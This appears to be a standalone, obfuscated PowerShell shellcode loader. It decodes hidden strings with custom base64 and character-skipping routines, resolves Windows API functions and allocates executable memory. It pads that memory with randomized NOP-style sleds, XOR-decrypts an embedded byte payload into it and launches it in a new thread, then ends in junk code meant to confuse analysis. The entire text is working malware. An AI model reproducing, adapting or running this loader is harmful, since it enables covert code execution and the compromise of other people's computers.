
(N`I -p (([String](Get-Command F:).CommandType)+':') -n flush_tU4m0FKTDiDgdW -value  {
    param (
        [string]$fork_KcQl9Ea9J04LCbGm,
        [int]$parse_wPR95sCbxmJVPH
    )
    $spawn_ytPnxgKbphmYTxJzkpmahXy = $fork_KcQl9Ea9J04LCbGm
    for ($log_lV0bwcgqDmsWSmf0fa = 0; $log_lV0bwcgqDmsWSmf0fa -lt $parse_wPR95sCbxmJVPH; $log_lV0bwcgqDmsWSmf0fa++) {
        $join_TEjchEp = [Convert]::FromBase64String($spawn_ytPnxgKbphmYTxJzkpmahXy)
        $spawn_ytPnxgKbphmYTxJzkpmahXy = [System.Text.Encoding]::UTF8.GetString($join_TEjchEp)
    }
    return $spawn_ytPnxgKbphmYTxJzkpmahXy
})>$fetch_GhazEMI0


(NI -p (([String](Get-Command D:).CommandType)+':') -n async_VhV_otcNbkGqtTjT0aSw -value  {
    param(
        $erase_pKBuhKr8FHb
    )

    for ($drop_Bi6LkfhNxrlenUdqrq8qvMbGvfCwQode_rIHLBnAkcWTqie=13-1; $drop_Bi6LkfhNxrlenUdqrq8qvMbGvfCwQode_rIHLBnAkcWTqie -lt $erase_pKBuhKr8FHb.Length; $drop_Bi6LkfhNxrlenUdqrq8qvMbGvfCwQode_rIHLBnAkcWTqie+=6){
        $drop_Bi6LkfhNxrlenUdqrq8qvMbGvfCwQ += $erase_pKBuhKr8FHb.substring.invoke($drop_Bi6LkfhNxrlenUdqrq8qvMbGvfCwQode_rIHLBnAkcWTqie, 1)
    }

    $drop_Bi6LkfhNxrlenUdqrq8qvMbGvfCwQ
})>$fetch_GhazEMI0

iex(flush_tU4m0FKTDiDgdW  13)
$ErrorActionPreference = (async_VhV_otcNbkGqtTjT0aSw "revoke_z3xo4Slist_ibind_ldata_elink_nencodtsync_ltraceypush_Ccloseoinsernexec_tunloaijoin_nnet_1urandoe")
$grant_wkOhR_me15M = @(@(0x48,0x31,0xc0,0x90),@(0x31,0xc0,0x90,0x90),@(0x66,0x31,0xc0,0x90),@(0x30,0xc0,0x90,0x90),@(0x30,0xe4,0x90,0x90),@(0x48,0x31,0xc9,0x90),@(0x31,0xc9,0x90,0x90),@(0x66,0x31,0xc9,0x90),@(0x30,0xc9,0x90,0x90),@(0x30,0xed,0x90,0x90),@(0x48,0x31,0xdb,0x90),@(0x31,0xdb,0x90,0x90),@(0x66,0x31,0xdb,0x90),@(0x30,0xdb,0x90,0x90),@(0x30,0xff,0x90,0x90),@(0x48,0x31,0xd2,0x90),@(0x31,0xd2,0x90,0x90),@(0x66,0x31,0xd2,0x90),@(0x30,0xd2,0x90,0x90),@(0x30,0xf6,0x90,0x90),@(0x48,0x31,0xf6,0x90),@(0x31,0xf6,0x90,0x90),@(0x66,0x31,0xf6,0x90))
$flush_PB0n798PCjBikxNWlX647tl1sC6YBi = [byte[]]@(0xb0,0x7e,0xaa,0x9b,0x40,0x9c,0xd9,0x23,0x23,0x50,0x32,0x25,0xcf,0x3e,0xfe,0x0f,0x0d,0x14,0x82,0xa4,0xd2,0xf5,0x3c,0x46,0x7c,0xf7,0x6c,0xe6,0x37,0xcf,0x72,0x86,0xbf,0xbc,0x51,0x85,0xc2,0x3e,0xa7,0xd5,0xcf,0xe9,0x4d,0x4b,0x36,0x29,0xc9,0x7b,0xf2,0x88,0x61,0x66,0x9c,0xc4,0xad,0x13,0x13,0xf0,0x53,0x1b,0xdf,0xf7,0x8d,0xe7,0x7f,0x01,0x9a,0x27,0x5d,0x8a,0xcd,0x20,0x16,0xa9,0x00,0xad,0x44,0x33,0x09,0x9f,0x26,0x19,0xa9,0xfa,0x47,0xaa,0x8c,0x7a,0xba,0xdd,0xc9,0x81,0xc7,0xd8,0x23,0x1d,0x7b,0xbf,0x91,0x8e,0x15,0xbd,0xe0,0xc5,0x8b,0x84,0x85,0x87,0xc8,0x04,0x8b,0x40,0xa0,0x05,0x1f,0x1a,0x09,0x0f,0xd8,0x4c,0x61,0x02,0xc1,0xbd,0x88,0x62,0x10,0x71,0x16,0xac,0x7d,0xfb,0xea,0x13,0x61,0xcd,0x35,0x0f,0x6d,0xb3,0x36,0x5c,0x37,0x14,0xa2,0xd4,0xb3,0xe2,0x5e,0xc5,0x20,0xe1,0x54,0x54,0x61,0x6a,0xc7,0x5a,0x5b,0xca,0x06,0x68,0xbe,0xa8,0xd9,0xa2,0x1e,0x2c,0xd6,0x81,0xf3,0x0a,0xc8,0xa8,0x67,0xca,0xb9,0x89,0x4e,0x45,0x7b,0x22,0x91,0xe0,0x8f,0x09,0x82,0x19,0x68,0x67,0xc4,0xec,0xba,0xf5,0xf5,0x3e,0x46,0xad,0xa9)
$task_0kzrhU = $flush_PB0n798PCjBikxNWlX647tl1sC6YBi.Length
$stop_eZ6A5Y = 79856 + $task_0kzrhU
$link_XBHmVS9Y_kLrahI6gExJjUL = LookupFunc (async_VhV_otcNbkGqtTjT0aSw "log_YnCvwx3Okstackeset_Vrport_nnet_3eexit_lsend_3net_p2") (async_VhV_otcNbkGqtTjT0aSw "deploy_e985YVrevokifind_rsort_tlisteudata_acore_lrenamAauto_lset_dltimerostartc")
$stack_f8Ji2naaFv5 = GetDelegateType @([IntPtr], [uint32], [uint32], [uint32]) ([IntPtr])
$backup_9dmrmvbb1g0eWUya6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($link_XBHmVS9Y_kLrahI6gExJjUL, $stack_f8Ji2naaFv5)
$unlink_mJB_E08 = $backup_9dmrmvbb1g0eWUya6.invoke([IntPtr]::Zero, $stop_eZ6A5Y, 0x3000, 0x40)

$thread_9X9iEn8QbQ1d1TIGC = 0
$link_XBHmVS9Y_kLrahI6gExJjUL = LookupFunc (async_VhV_otcNbkGqtTjT0aSw "delete_HJdsrmsignassync_vcomprcextrarhash_t") (async_VhV_otcNbkGqtTjT0aSw "open_9h1rHHsmcompieunloammap_ysnet_Metrim_t")
$stack_f8Ji2naaFv5 = GetDelegateType $([IntPtr], [uint32], [uint32])
$backup_9dmrmvbb1g0eWUya6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($link_XBHmVS9Y_kLrahI6gExJjUL, $stack_f8Ji2naaFv5)
while($thread_9X9iEn8QbQ1d1TIGC -le 79856/4){
    $kill_VJqRgtQUjZr1I7a8LAIdYopu4 = (New-Object System.Random).Next(0, $grant_wkOhR_me15M.Length-1)
    $backup_9dmrmvbb1g0eWUya6.invoke($unlink_mJB_E08.ToInt64()+$thread_9X9iEn8QbQ1d1TIGC, $grant_wkOhR_me15M[$kill_VJqRgtQUjZr1I7a8LAIdYopu4][0], 1)
    $thread_9X9iEn8QbQ1d1TIGC+=1
    $backup_9dmrmvbb1g0eWUya6.invoke($unlink_mJB_E08.ToInt64()+$thread_9X9iEn8QbQ1d1TIGC, $grant_wkOhR_me15M[$kill_VJqRgtQUjZr1I7a8LAIdYopu4][1], 1)
    $thread_9X9iEn8QbQ1d1TIGC+=1
    $backup_9dmrmvbb1g0eWUya6.invoke($unlink_mJB_E08.ToInt64()+$thread_9X9iEn8QbQ1d1TIGC, $grant_wkOhR_me15M[$kill_VJqRgtQUjZr1I7a8LAIdYopu4][2], 1)
    $thread_9X9iEn8QbQ1d1TIGC+=1
    $backup_9dmrmvbb1g0eWUya6.invoke($unlink_mJB_E08.ToInt64()+$thread_9X9iEn8QbQ1d1TIGC, $grant_wkOhR_me15M[$kill_VJqRgtQUjZr1I7a8LAIdYopu4][3], 1)
    $thread_9X9iEn8QbQ1d1TIGC+=1
}


$lock_3bzSIe1yNJ = @(0x83,0xb7,0xce,0x10,0x09,0xac,0x52,0x6a,0x2f,0xdb,0x7b,0x39,0x44,0x67,0xf6,0x84,0x4c,0x34,0x09,0xad,0x52,0x8d,0x30,0x75,0x09,0x05,0xe7,0x0d,0x34,0xa2,0x4e,0x0d,0xd2,0xc4,0x52,0x6e,0x49,0x7b,0x87,0xd6,0x0c,0xda,0x9f,0xc0,0x02,0xb9,0xca,0x88,0xb0,0x09,0x5f,0x21,0xf9,0xb0,0xfd,0x66,0xe1,0x71,0x2d,0x1f,0xad,0x98,0xee,0xa6,0x0a,0xe8,0x11,0x52,0x79,0x89,0x3e,0x46,0x9d,0xbd,0x56,0x26,0x31,0x2f,0x0a,0x6c,0xad,0x6d,0x3f,0x06,0x44,0x59,0xbf,0x85,0xed,0xb5,0xa8,0xf3,0xbe,0x99,0x4b,0x51,0x12,0xdd,0xe3,0xe6,0x59,0xd2,0x81,0xa1,0xdf,0xd7,0x7a,0x51,0xfb,0xcd,0xdc,0x26,0x19,0x36,0x2d,0x4b,0x61,0x7a,0xab,0x29,0x13,0x56,0x3e,0x6d,0xdf,0x0a,0x7f,0x09,0x57,0xad)
for ($socket_Bk_wBrpUYF5mt_Bghb32Re = 0; $socket_Bk_wBrpUYF5mt_Bghb32Re -le $task_0kzrhU;$socket_Bk_wBrpUYF5mt_Bghb32Re++){
    $backup_9dmrmvbb1g0eWUya6.invoke($thread_9X9iEn8QbQ1d1TIGC+$socket_Bk_wBrpUYF5mt_Bghb32Re+$unlink_mJB_E08.ToInt64(), $flush_PB0n798PCjBikxNWlX647tl1sC6YBi[$socket_Bk_wBrpUYF5mt_Bghb32Re] -bxor $lock_3bzSIe1yNJ[$socket_Bk_wBrpUYF5mt_Bghb32Re % $lock_3bzSIe1yNJ.Length],1)
}

$link_XBHmVS9Y_kLrahI6gExJjUL = LookupFunc (async_VhV_otcNbkGqtTjT0aSw "sort_Mw8BXDxuexit_sreducebind_ropen_3trace2") (async_VhV_otcNbkGqtTjT0aSw "build_LEmJGvCnet_Wainserlmemorlsort_Wqueueilist_nsignadfile_oset_lwstreaPcacherunlocoinit_ccore_A")
$stack_f8Ji2naaFv5 = GetDelegateType @([intPtr], [intPtr], [IntPtr], [intPtr], [intPtr]) ([IntPtr])
$backup_9dmrmvbb1g0eWUya6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($link_XBHmVS9Y_kLrahI6gExJjUL, $stack_f8Ji2naaFv5)
$backup_9dmrmvbb1g0eWUya6.invoke($unlink_mJB_E08, 0, 0, 0, 0)

try{
    "convert_w6fhq_UatJXEWsy5nsW9I6d2DIBGb0UTbSlkpsvrPsAHMW0brt3nYB_1rVhDiR95tS14JegQAupgdTpxfTxVI4udwKM5TyaQK2qVKhoLJThUgw666UigU1L9qJFcGwCoN84DfYLkdaDDQYENKdJbAW5v2ao1_aILdTBauIh5SpEYMYnSN6skVNHBxcLN7HdqiEhAfMj0YAoZIVOugM2v5ntFTJj_ULGsoyZJ3w" -split "." |%{ extract_YOsMknJaFhIV42ixxfu4cPBFwhWzAtYtj7q3pacTC8JIdpvNbUTDHOI9ZkKTF_6Yk3EnftzagkwEN1GkrCn6LBD1uu3ylSm7t_SxXwmC99ecp5W6N4hTzg80V21oDN3KxMKOK3T2tzyYDSNqqvJ1Ow_6mI1D8ixlch_fpqFVp1SQJbSES4wkMCkHXt_uje8w3nTwtSypztOgVuorH1RMuhon5ZnsPCJq_5v6KViL $_}
} catch {
    $reset_DXThrtt6njhkrH60R7Z4qgZE51i6bAXuO1KKWKVzzaY3N01X9QI8wjbID1UDijRXFWxZS28GCtlbnjhQa8hcePUFCg0jbFTra4PECJG76YF = $_.Exception
    sleep 8619-(878-1)
}
